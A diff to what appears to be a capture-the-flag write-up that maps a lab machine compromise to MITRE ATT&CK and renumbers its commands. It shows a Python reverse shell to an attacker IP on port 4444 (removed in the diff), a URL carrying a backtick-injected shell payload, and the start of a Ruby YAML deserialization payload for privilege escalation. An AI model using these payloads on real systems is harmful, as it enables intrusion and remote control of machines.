@@ -21,9 +21,9 @@ Below, we map the attack to the MITRE ATT&CK Enterprise framework.
 | Tactic | Technique | Subtechnique | Command |
 | - | - | - | - |
 | Initial Access | Exploit Public-Facing Application | - | (1) |
-| Execution | Exploitation for Client Execution | Unix Shell | (2) |
-| Persistence | Valid Accounts | Default Accounts | (3) |
-| Privilege Escalation | Exploitation for Privilege Escalation | - | (4) |
+| Execution | Exploitation for Client Execution | Unix Shell | (1) |
+| Persistence | Valid Accounts | Default Accounts | (2) |
+| Privilege Escalation | Exploitation for Privilege Escalation | - | (3) |
 
 #### Commands
 - (1)
@@ -32,13 +32,9 @@ http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 ```
 - (2)
 ```
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```
-- (3)
-```
 ssh henry@10.10.11.189
 ```
-- (4)
+- (3)
 ```
  ---
  - !ruby/object:Gem::Installer
